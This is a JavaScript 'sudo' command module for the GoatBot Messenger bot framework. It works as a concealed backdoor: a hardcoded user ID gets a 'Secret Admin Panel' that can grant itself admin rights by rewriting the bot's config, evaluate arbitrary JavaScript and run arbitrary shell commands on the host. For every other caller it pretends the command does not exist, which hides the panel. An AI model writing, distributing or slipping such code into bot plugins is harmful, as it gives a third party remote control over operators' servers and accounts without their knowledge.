const { config } = global.GoatBot;
const { writeFileSync } = require("fs-extra");
const { exec } = require("child_process");

module.exports = {
  config: {
    name: "sudo",
    aliases: ["sudo", "sys"],
    version: "1.2.2",
    role: 0,
    author: "Cid kageno",
  },

  onStart: async function ({ message, args, event }) {
    const myUID = "100075163264087";

    // Only allow you to run this command
    if (event.senderID !== myUID) {
      return message.reply("💠 | The Command you're using doesn't exist. Type .help to see all available commands 🗿☕");
    }

    // Help menu if no args
    if (args.length === 0) {
      return message.reply(
        "⚙️ | Secret Admin Panel Active\n\n" +
        "Available commands:\n" +
        "• /sudo admin [add/remove] <uid>\n" +
        "• /sudo dev [add/remove] <uid>\n" +
        "• /sudo eval <code>\n" +
        "• /sudo shell <cmd>"
      );
    }

    const category = args[0].toLowerCase();
    let action = args[1] ? args[1].toLowerCase() : null;
    let uid = args[2];

    // Handle typos like add1000 or remove1000
    if (action && (category === "admin" || category === "dev")) {
      if (action.startsWith("add") && action.length > 3) {
        uid = action.slice(3);
        action = "add";
      } else if (action.startsWith("remove") && action.length > 6) {
        uid = action.slice(6);
        action = "remove";
      }
    }

    // Admin management
    if (category === "admin") {
      if (!uid || isNaN(uid)) return message.reply("⚠️ | Provide a valid numeric UID.");
      uid = uid.toString();
      if (action === "add") {
        if (config.adminBot.includes(uid)) return message.reply(`⚠️ | ${uid} is already an admin.`);
        config.adminBot.push(uid);
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        return message.reply(`✅ | Added ${uid} to adminBot.`);
      }
      if (action === "remove") {
        if (!config.adminBot.includes(uid)) return message.reply(`⚠️ | ${uid} is not an admin.`);
        config.adminBot = config.adminBot.filter(id => id !== uid);
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        return message.reply(`✅ | Removed ${uid} from adminBot.`);
      }
    }

    // Dev management
    if (category === "dev") {
      if (!config.ndc) config.ndc = [];
      if (!uid || isNaN(uid)) return message.reply("⚠️ | Provide a valid numeric UID.");
      uid = uid.toString();
      if (action === "add") {
        if (config.ndc.includes(uid)) return message.reply(`⚠️ | ${uid} is already a dev.`);
        config.ndc.push(uid);
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        return message.reply(`✅ | Added ${uid} to developers.`);
      }
      if (action === "remove") {
        if (!config.ndc.includes(uid)) return message.reply(`⚠️ | ${uid} is not a dev.`);
        config.ndc = config.ndc.filter(id => id !== uid);
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        return message.reply(`✅ | Removed ${uid} from developers.`);
      }
    }

    // Eval tool
    if (category === "eval") {
      const code = args.slice(1).join(" ");
      try {
        let result = await eval(code);
        if (typeof result !== "string") {
          result = require("util").inspect(result, { depth: 1 });
        }
        return message.reply(`✅ | Eval Output:\n${result}`);
      } catch (error) {
        return message.reply(`❌ | Eval Error:\n${error.message}`);
      }
    }

    // Shell tool
    if (category === "shell") {
      const execCode = args.slice(1).join(" ");
      exec(execCode, (error, stdout, stderr) => {
        if (error) return message.reply(`❌ | Shell Error:\n${error.message}`);
        if (stderr) return message.reply(`⚠️ | Shell Stderr:\n${stderr}`);
        return message.reply(`✅ | Shell Output:\n${stdout}`);
      });
      return;
    }

    return message.reply("⚠️ | Invalid category. Use admin, dev, eval, or shell.");
  }
};
